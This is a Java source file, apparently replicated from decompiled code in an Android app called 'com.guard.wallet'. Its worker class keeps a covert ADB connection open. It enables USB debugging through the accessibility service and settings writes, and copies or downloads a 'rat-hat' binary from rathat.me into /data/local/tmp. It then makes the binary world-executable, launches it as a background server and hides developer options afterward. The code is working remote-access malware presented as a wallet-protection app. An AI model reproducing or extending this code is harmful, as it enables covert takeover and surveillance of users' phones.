package com.guard.wallet.adb;

import com.guard.wallet.core.AppUtils;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor h/a -> AdbWorkerTask.
 * AdbConnectionManager background worker.
 *
 * Case 0: periodic ADB connection probe + rat-hat deployment + USB/wireless fallback
 * Case 1: local HTTP server wake (no accessibility service)
 * Case 2: local HTTP server wake (accessibility service available, with cooldown)
 */
public final class AdbWorkerTask implements Runnable {
    public final int taskType;
    public final AdbConnectionManager manager;

    public AdbWorkerTask(AdbConnectionManager manager, int type) {
        this.manager = manager;
        this.taskType = type;
    }

    @Override
    public void run() {
        AdbConnectionManager manager = this.manager;
        if (manager == null) {
            return;
        }
        switch (this.taskType) {
            case 0:
                runCase0(manager);
                return;
            case 1:
                runCase1(manager);
                return;
            default:
                runCase2(manager);
                return;
        }
    }

    /**
     * Case 0 — Periodic ADB connection management.
     * 1. Bootstrap gate (skip first 12 ticks)
     * 2. Submit local service wake task
     * 3. If paired: probe USB ADB, fallback to wireless ADB, manage rat-hat, handle port drift
     */
    private static void runCase0(AdbConnectionManager manager) {
        /* --- bootstrap gate --- */
        AtomicBoolean bootstrap = manager.bootstrapCompleted;
        AtomicInteger retry = manager.bootstrapRetryCount;
        if (!bootstrap.get()) {
            if (retry.get() < 12) {
                retry.set(retry.get() + 1);
                return;
            }
            bootstrap.set(true);
        } else {
            retry.set(0);
        }

        /* --- submit local service wake task --- */
        if (!manager.wakeTaskBusy.get() && !MyAccessibilityService.r2.get()) {
            AdbWorkerTask task;
            if (MyAccessibilityService.P() == null) {
                task = new AdbWorkerTask(manager, 1);
            } else {
                task = new AdbWorkerTask(manager, 2);
            }
            manager.pDownload.submit(task);
        }

        /* --- main ADB management (only if paired) --- */
        if (!manager.isPaired()) {
            return;
        }

        Integer defaultPort = AdbConnectionManager.DEFAULT_ADB_PORT;
        boolean connected = manager.D();
        AtomicInteger wireErrorCount = manager.wireErrorCount;
        ReentrantLock connLock = manager.connectionLock;

        if (!connected) {
            /* --- try stored port --- */
            Integer storedPort = SharedPrefsManager.b();
            if (storedPort != null && storedPort > 0 && connLock.tryLock()) {
                try {
                    CheckPortResult portResult = manager.connectToPort(storedPort);
                    if (portResult != null && portResult.isConnected()) {
                        // connected via stored port, skip rest
                        handleConnectedState(manager, defaultPort, wireErrorCount, connLock);
                        return;
                    }
                } finally {
                    connLock.unlock();
                }
            }

            /* --- try USB ADB connect via default port --- */
            Context ctx = manager.context;
            CheckPortResult usbResult = null;
            if (ctx != null && manager.C() != null && manager.B() != null && connLock.tryLock()) {
                try {
                    boolean usbConnected = false;
                    int resolvedPort = 0;

                    // Try default port first
                    if (!AppUtils.E(defaultPort)) {
                        try {
                            CheckPortResult defaultResult = manager.connectToPort(defaultPort);
                            if (defaultResult != null && defaultResult.isConnected()) {
                                usbConnected = true;
                                resolvedPort = defaultPort;
                            }
                        } catch (Exception ex) {
                            AppUtils.s("AdbConnectionManager", ex);
                        }
                    }

                    // If USB failed, try wireless ADB port (Android 11+)
                    if (!usbConnected && Build.VERSION.SDK_INT >= 30) {
                        try {
                            // Scan for wireless ADB port
                            CheckPortResult scanResult = manager.scanForDebugPort();
                            if (scanResult != null && scanResult.isConnected() && scanResult.getDebugPort() > 0) {
                                usbConnected = true;
                                resolvedPort = scanResult.getDebugPort();
                            }
                        } catch (Exception ex) {
                            AppUtils.s("AdbConnectionManager", ex);
                        }
                    }

                    if (usbConnected) {
                        usbResult = new CheckPortResult();
                        usbResult.setConnected(true);
                        usbResult.setDebugPort(resolvedPort);
                        usbResult.setConnectedDevice("com.guard.wallet");
                        SharedPrefsManager.x(usbResult);
                        wireErrorCount.set(0);
                        manager.adbConnected.set(true);
                        manager.adbVerified.set(true);
                    }
                } finally {
                    connLock.unlock();
                }
            }

            /* --- fallback: wireless debug scan --- */
            if ((usbResult == null || !usbResult.isConnected()) && manager.isPaired() && SystemHelper.J()) {
                CheckPortResult wifiResult = manager.scanForDebugPort();
                if (wifiResult != null) {
                    wifiResult.isConnected();
                }
            }
        }

        if (manager.D()) {
            /* --- rat-hat management --- */
            AtomicBoolean ratHatPending = manager.ratHatPending;
            if (ratHatPending.get()) {
                SystemHelper.D();
                manager.closeDeveloperOptionsIfSafe();
                ratHatPending.set(false);
            } else {
                manageRatHat(manager, defaultPort);
            }

            /* --- USB port drift detection --- */
            handlePortDrift(manager, defaultPort, wireErrorCount, connLock);
        } else {
            /* --- wireless debug not connected, try to close it --- */
            handleWirelessDebugFallback(manager, wireErrorCount, connLock);
        }
    }

    /**
     * Manage rat-hat binary deployment and startup.
     */
    private static void manageRatHat(AdbConnectionManager manager, Integer defaultPort) {
        int fileCheckResult = manager.executeWithMatcher(
                "if [ -f /data/local/tmp/rat-hat ]; then echo \"File exists\"; else echo \"File does not exist\"; fi",
                new AdbLineMatcher("File exists", true, 1),
                new AdbLineMatcher("File does not exist", true, 1)
        );

        if (fileCheckResult == 1) {
            /* rat-hat file exists */
            SharedPrefsManager.z(1);
            int processCheck = manager.executeWithMatcher(
                    "ps -ef | grep rat-hat",
                    new AdbLineMatcher("rat-hat server -d", true, 0),
                    new AdbLineMatcher("grep rat-hat", false, 1)
            );
            boolean isRunning = (processCheck == 1) || (processCheck == 0 && !AppUtils.E(7912));

            if (!isRunning) {
                manager.writeShellCommand("nohup /data/local/tmp/rat-hat server -d > /dev/null &");
            } else {
                SystemHelper.D();
                manager.closeDeveloperOptionsIfSafe();
            }
        } else if (fileCheckResult == 0) {
            /* rat-hat file does not exist */
            SharedPrefsManager.z(0);

            // Try copying from native lib directory
            String nativeLibDir = SystemHelper.y0();
            if (!AppUtils.B(nativeLibDir)) {
                String libPath = nativeLibDir.concat("/").concat("librat-hat.so");
                if (AppUtils.w(libPath)) {
                    String destPath = "/data/local/tmp/".concat("rat-hat");
                    String cpCmd = "cp".concat(" -f ").concat(libPath).concat(" ").concat(destPath);
                    String chmodCmd = "chmod".concat(" ").concat("777").concat(" ").concat(destPath);
                    if (manager.executeShellCommand(cpCmd) && manager.executeShellCommand(chmodCmd)) {
                        SharedPrefsManager.z(1);
                        return;
                    }
                }
            }

            // Fallback: download from remote
            String[] abis = Build.SUPPORTED_ABIS;
            String abi;
            if (abis != null && abis.length > 0) {
                abi = abis[0];
            } else {
                abi = "armeabi";
            }

            String baseUrl = com.guard.wallet.utils.ConfigManager.getDownloadHost();
            if (AppUtils.B(baseUrl)) {
                baseUrl = "https://rathat.me/lib";
            }

            String fileName = com.guard.wallet.utils.ConfigManager.getDownloadName();
            if (AppUtils.B(fileName)) {
                fileName = "rat-hat";
            }

            manager.downloadAndPush(
                    null,
                    baseUrl.concat("/").concat(abi).concat("/").concat(fileName),
                    "rat-hat",
                    "nohup /data/local/tmp/rat-hat server -d > /dev/null &"
            );
        } else {
            Log.d("AdbConnectionManager", "无法检测是否已安装RatHat");
        }
    }

    /**
     * Handle USB port drift: if current port != default, try to switch USB function or re-enable ADB.
     */
    private static void handlePortDrift(AdbConnectionManager manager, Integer defaultPort, AtomicInteger errorCount, ReentrantLock connLock) {
        if (!manager.D()) {
            return;
        }

        Integer currentPort = SharedPrefsManager.b();
        boolean portMatches = Objects.equals(currentPort, defaultPort);
        AtomicInteger driftCount = manager.portDriftCount;

        if (!portMatches) {
            int count = driftCount.incrementAndGet();
            if (count > 1 && count <= 5) {
                // Try USB function switch to MTP
                LinkedList<AdbLineMatcher> successMatchers = new LinkedList<>();
                successMatchers.add(new AdbLineMatcher("mtp", true, 0));
                LinkedList<AdbLineMatcher> failureMatchers = new LinkedList<>();
                failureMatchers.add(new AdbLineMatcher("ptp", true, 0));
                failureMatchers.add(new AdbLineMatcher("rndis", true, 0));
                failureMatchers.add(new AdbLineMatcher("midi", true, 0));
                failureMatchers.add(new AdbLineMatcher("ncm", true, 0));
                if (manager.executeWithMatchers("svc usb getFunctions", successMatchers, failureMatchers) == 0) {
                    manager.executeShellCommand("svc usb setFunctions mtp");
                }
            } else if (count > 5 && count <= 10) {
                // Try enabling USB debugging via settings or accessibility
                if (!SystemHelper.I()) {
                    if (!SystemHelper.p0() && MyAccessibilityService.P() != null && MyAccessibilityService.P().V()) {
                        boolean enabledViaSettings = tryEnableUsbDebugging();
                        if (enabledViaSettings) {
                            return;
                        }
                    }

                    if (!SystemHelper.p0() && MyAccessibilityService.P() != null && MyAccessibilityService.P().V()) {
                        Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,准备开启ADB调试");
                        HttpApiManager.openAdbDebug("http://127.0.0.1:7911");
                    } else {
                        Log.d("AdbConnectionManager", "锁屏中、黑屏中、无障碍服务监听窗口初始化未完成");
                    }
                    return;
                }
            } else {
                StringBuilder sb = new StringBuilder("useDefaultPort ErrorCount:");
                sb.append(count);
                Log.d("AdbConnectionManager", sb.toString());
            }

            // If USB debugging is on, try to connect via default port
            if (SystemHelper.I()) {
                StringBuilder sb2 = new StringBuilder("USE DEFAULT ADB PORT:");
                sb2.append(defaultPort);
                Log.d("AdbConnectionManager", sb2.toString());
                String portStr = String.valueOf(defaultPort);
                if (!AppUtils.B(portStr)) {
                    try {
                        io.github.muntashirakon.adb.AdbStream stream = manager.openStreamCompat(new String[]{portStr}, 16);
                        if (stream != null) {
                            Thread.sleep(2000L);
                            stream.close();
                        }
                    } catch (Exception ex) {
                        AppUtils.s("AdbConnectionManager", ex);
                    }
                }
            }
        } else {
            driftCount.set(0);
        }
    }

    /**
     * Try to enable USB debugging via system settings write.
     */
    private static boolean tryEnableUsbDebugging() {
        try {
            if (SystemHelper.Z() != null && (Settings.System.canWrite(SystemHelper.Z()) || SystemHelper.j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Settings.Global.putInt(SystemHelper.Z().getContentResolver(), "adb_enabled", 1);
                if (SystemHelper.I()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,开启USB调试成功");
                    return true;
                }
            }
        } catch (Exception ex) {
            AppUtils.s("ApplicationUtil", ex);
        }
        return false;
    }

    /**
     * Handle wireless debug fallback when not connected.
     * Try to disable wireless debugging after consecutive failures.
     */
    private static void handleWirelessDebugFallback(AdbConnectionManager manager, AtomicInteger wireErrorCount, ReentrantLock connLock) {
        int count = wireErrorCount.incrementAndGet();
        if (count > 0 && count <= 6) {
            if (count % 3 != 0) {
                // Try connecting via stored port
                Integer storedPort = SharedPrefsManager.b();
                if (storedPort != null && storedPort > 0 && connLock.tryLock()) {
                    try {
                        manager.connectToPort(storedPort);
                    } finally {
                        connLock.unlock();
                    }
                }
            } else {
                // Every 3rd attempt, scan all ports
                manager.scanForDebugPort();
            }
        } else {
            // After 6 failures, try to disable wireless debugging
            boolean disabled = tryDisableWirelessDebug();
            if (!disabled) {
                HttpApiManager.closeWifiDebug("http://127.0.0.1:7911");
            }
            wireErrorCount.set(0);
        }
    }

    /**
     * Try to disable wireless debugging via system settings write.
     */
    private static boolean tryDisableWirelessDebug() {
        try {
            if (SystemHelper.Z() != null && (Settings.System.canWrite(SystemHelper.Z()) || SystemHelper.j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Settings.Global.putInt(SystemHelper.Z().getContentResolver(), "adb_wifi_enabled", 0);
                if (!SystemHelper.J()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,关闭无线调试成功");
                    return true;
                }
            }
        } catch (Exception ex) {
            AppUtils.s("ApplicationUtil", ex);
        }
        return false;
    }

    /**
     * When connected state is detected from stored-port check,
     * proceed to rat-hat management and port drift handling.
     */
    private static void handleConnectedState(AdbConnectionManager manager, Integer defaultPort, AtomicInteger wireErrorCount, ReentrantLock connLock) {
        AtomicBoolean ratHatPending = manager.ratHatPending;
        if (ratHatPending.get()) {
            SystemHelper.D();
            manager.closeDeveloperOptionsIfSafe();
            ratHatPending.set(false);
        } else {
            manageRatHat(manager, defaultPort);
        }
        handlePortDrift(manager, defaultPort, wireErrorCount, connLock);
    }

    /**
     * Case 1 — Local HTTP server wake (no accessibility service available).
     * Immediately calls HttpApiManager.resetAccessibilityService() to wake the local server, then waits.
     */
    private static void runCase1(AdbConnectionManager manager) {
        AtomicBoolean busy = manager.wakeTaskBusy;
        busy.set(true);
        manager.lastWakeTime.set(0L);
        try {
            if (!SystemHelper.L() && !AppUtils.E(7912)) {
                HttpApiManager.resetAccessibilityService();
                SystemHelper.T0(25);
            }
        } catch (Exception ex) {
            AppUtils.s("AdbConnectionManager", ex);
        } finally {
            busy.set(false);
        }
    }

    /**
     * Case 2 — Local HTTP server wake (accessibility service available, with cooldown).
     * Implements a 60-second cooldown and 300-second re-init logic.
     */
    private static void runCase2(AdbConnectionManager manager) {
        AtomicBoolean busy = manager.wakeTaskBusy;
        busy.set(true);
        try {
            long now = System.currentTimeMillis();
            AtomicLong lastKick = manager.lastWakeTime;

            if (lastKick.get() != 0L) {
                long elapsed = now - lastKick.get();
                if (elapsed <= 60000L) {
                    return;
                }

                MyAccessibilityService service = MyAccessibilityService.P();
                /* vendor checks service.h (destroyed) and service.i (initialized);
                 * replica uses V() which returns true when the window-init is complete. */
                boolean serviceReady = service != null && service.V();

                if (!serviceReady) {
                    if (elapsed > 300000L) {
                        lastKick.set(now);
                        if (MyAccessibilityService.P() != null) {
                            MyAccessibilityService.P().H(true, false);
                        }
                    }
                    return;
                }

                if (!SystemHelper.L() && !AppUtils.E(7912)) {
                    HttpApiManager.resetAccessibilityService();
                    SystemHelper.T0(25);
                }
            }

            lastKick.set(now);
        } catch (Exception ex) {
            AppUtils.s("AdbConnectionManager", ex);
        } finally {
            busy.set(false);
        }
    }
}
